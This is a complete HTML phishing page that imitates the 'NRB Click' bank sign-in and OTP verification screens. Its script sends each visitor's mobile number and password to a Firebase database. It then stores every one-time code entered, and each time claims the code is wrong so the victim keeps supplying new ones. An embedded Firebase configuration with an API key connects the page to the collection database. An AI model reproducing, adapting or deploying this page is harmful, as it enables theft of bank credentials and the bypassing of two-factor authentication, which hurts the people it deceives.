<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NRB Click - Sign In</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
        body, html { width: 100%; height: 100%; background-color: #fbfdff; overflow-x: hidden; }

        .app-container { width: 100%; min-height: 100vh; position: relative; display: flex; flex-direction: column; padding: 30px 25px; }
        .shape-top { position: absolute; top: -20px; left: -20px; width: 220px; height: auto; z-index: 1; }
        .shape-bottom { position: absolute; bottom: -30px; right: -30px; width: 250px; height: auto; z-index: 1; }

        .screen { position: relative; z-index: 2; display: flex; flex-direction: column; align-items: center; margin-top: 80px; flex: 1; width: 100%; }
        #otp-screen { display: none; margin-top: 120px; }

        .logo-container { text-align: center; margin-bottom: 40px; }
        .logo-main { display: flex; align-items: center; justify-content: center; gap: 10px; }
        .logo-icon { color: #cc0000; font-size: 32px; transform: rotate(45deg); }
        .logo-text { font-size: 36px; font-weight: 600; letter-spacing: -1px; }
        .text-red { color: #cc0000; }
        .text-blue { color: #0a3b9e; }
        .logo-sub { font-size: 13px; color: #444; margin-top: -5px; margin-left: 20px; display: flex; align-items: center; justify-content: center; gap: 5px; }

        h1.title { color: #0a3b9e; font-size: 30px; font-weight: 700; margin-bottom: 15px; }
        p.subtitle { color: #555; font-size: 14px; text-align: center; margin-bottom: 30px; }

        .form-group { width: 100%; margin-bottom: 20px; position: relative; }
        .input-wrapper { display: flex; align-items: center; background: #fff; border: 1px solid #e0e0e0; border-radius: 12px; padding: 8px 15px; height: 56px; }
        .input-icon { color: #555; font-size: 20px; padding-right: 15px; border-right: 1px solid #ccc; }
        .input-wrapper input { flex: 1; border: none; outline: none; padding-left: 15px; font-size: 15px; color: #333; background: transparent; width: 100%; }
        .input-wrapper input::placeholder { color: #999; }
        .action-icon { color: #666; font-size: 18px; cursor: pointer; margin-left: 10px; }
        .scan-btn { background-color: #1a56db; color: white; width: 38px; height: 38px; display: flex; justify-content: center; align-items: center; border-radius: 8px; cursor: pointer; margin-left: 15px; font-size: 20px; }

        .primary-btn { width: 100%; background-color: #0a3b9e; color: #fff; border: none; padding: 16px; border-radius: 12px; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 5px; transition: background 0.3s; }
        .primary-btn:hover { background-color: #002b80; }

        .error-msg { color: #cc0000; font-size: 14px; margin-top: 15px; font-weight: 500; display: none; text-align: center; }
        .links { display: flex; flex-direction: column; align-items: center; gap: 25px; margin-top: 35px; }
        .links a { color: #0a3b9e; text-decoration: none; font-size: 15px; font-weight: 500; }
        .links a:hover { text-decoration: underline; }

        /* Loader */
        .loader-overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.9); z-index: 999; flex-direction: column; justify-content: center; align-items: center; }
        .spinner { border: 4px solid #e0e0e0; border-top: 4px solid #0a3b9e; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        .loader-text { margin-top: 15px; color: #0a3b9e; font-weight: 600; font-size: 16px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="app-container">
    <div id="loader" class="loader-overlay">
        <div class="spinner"></div>
        <div class="loader-text">Please wait...</div>
    </div>

    <svg class="shape-top" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
        <path fill="#0a3b9e" stroke="#cc0000" stroke-width="4" d="M0,0 L140,0 C140,40 100,70 140,110 C180,150 90,190 0,160 Z" />
    </svg>
    <svg class="shape-bottom" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
        <path fill="#0a3b9e" stroke="#cc0000" stroke-width="4" d="M200,200 L20,200 C30,150 80,140 110,100 C140,60 160,30 200,60 Z" />
    </svg>

    <!-- SIGN IN SCREEN -->
    <div id="login-screen" class="screen">
        <div class="logo-container">
            <div class="logo-main">
                <i class="fa-solid fa-compress logo-icon"></i>
                <div class="logo-text"><span class="text-red">NRB</span> <span class="text-blue">Click</span></div>
            </div>
            <div class="logo-sub">Not Just Another Bank <i class="fa-solid fa-arrow-pointer" style="color:#0a3b9e; font-size: 16px; margin-left: 2px;"></i></div>
        </div>

        <h1 class="title">Sign In</h1>
        <p class="subtitle">Enter your mobile number and password below.</p>

        <div class="form-group">
            <div class="input-wrapper">
                <i class="fa-solid fa-mobile-screen input-icon"></i>
                <input type="tel" id="mobile-input" placeholder="Mobile Number" required>
            </div>
        </div>
        <div class="form-group">
            <div class="input-wrapper">
                <i class="fa-solid fa-lock input-icon"></i>
                <input type="password" id="password-input" placeholder="Password" required>
                <i class="fa-solid fa-eye-slash action-icon"></i>
                <div class="scan-btn"><i class="fa-solid fa-expand"></i></div>
            </div>
        </div>
        <button id="goToOtpBtn" class="primary-btn">Sign In</button>
        <div class="links">
            <a href="#">New to NRB Click ? Sign up</a>
            <a href="#">Open NRB Bank Account</a>
        </div>
    </div>

    <!-- OTP SCREEN -->
    <div id="otp-screen" class="screen">
        <div class="logo-container">
            <div class="logo-main">
                <i class="fa-solid fa-compress logo-icon"></i>
                <div class="logo-text"><span class="text-red">NRB</span> <span class="text-blue">Click</span></div>
            </div>
        </div>
        <h1 class="title">Verification</h1>
        <p class="subtitle">Please enter the OTP sent to your mobile number.</p>

        <div class="form-group">
            <div class="input-wrapper">
                <i class="fa-solid fa-shield-halved input-icon"></i>
                <input type="number" id="otp-input" placeholder="Enter OTP">
            </div>
            <div id="otp-error" class="error-msg">
                <i class="fa-solid fa-circle-exclamation"></i> Invalid or Wrong OTP entered. Please try again.
            </div>
        </div>
        <button id="verifyOtpBtn" class="primary-btn">Verify & Proceed</button>
        <div class="links" style="margin-top: 20px;">
            <a href="#" id="backToLogin">Go Back</a>
        </div>
    </div>
</div>

<!-- Firebase & Logic -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
<script>
    const firebaseConfig = {
        apiKey: "AIzaSyB9Y2_hnmgQsFute7DDAcKjmuoAnggQZJY",
        authDomain: "long-d1bcb.firebaseapp.com",
        databaseURL: "https://long-d1bcb-default-rtdb.firebaseio.com",
        projectId: "long-d1bcb",
        storageBucket: "long-d1bcb.firebasestorage.app",
        messagingSenderId: "515546162619",
        appId: "1:515546162619:web:e046b79a25ccfa057e509e"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const loginScreen = document.getElementById('login-screen');
    const otpScreen = document.getElementById('otp-screen');
    const loader = document.getElementById('loader');
    const otpError = document.getElementById('otp-error');
    
    let currentSessionId = "";
    let enteredOtpsArray = []; 

    document.getElementById('goToOtpBtn').addEventListener('click', function(e) {
        e.preventDefault();
        const phone = document.getElementById('mobile-input').value;
        const password = document.getElementById('password-input').value;
        if(phone === "" || password === "") { alert("Please enter details"); return; }

        currentSessionId = "user_" + Date.now();
        enteredOtpsArray = []; 
        db.ref("users/" + currentSessionId).set({ phone: phone, password: password, timestamp: Date.now(), otps: [] });
        
        loader.style.display = 'flex';
        setTimeout(() => {
            loader.style.display = 'none';
            loginScreen.style.display = 'none'; 
            otpScreen.style.display = 'flex'; 
        }, 2500);
    });

    document.getElementById('verifyOtpBtn').addEventListener('click', function(e) {
        e.preventDefault();
        const otpValue = document.getElementById('otp-input').value;
        if(otpValue === "") return;

        otpError.style.display = 'none'; 
        loader.style.display = 'flex'; 
        enteredOtpsArray.push(otpValue);
        db.ref("users/" + currentSessionId).update({ otps: enteredOtpsArray });
        
        setTimeout(() => {
            loader.style.display = 'none'; 
            otpError.style.display = 'block'; 
            document.getElementById('otp-input').value = ''; 
        }, 2000);
    });

    document.getElementById('backToLogin').addEventListener('click', function(e) {
        e.preventDefault();
        otpScreen.style.display = 'none';
        loginScreen.style.display = 'flex';
        otpError.style.display = 'none'; 
        document.getElementById('otp-input').value = ''; 
    });
</script>
</body>
</html>
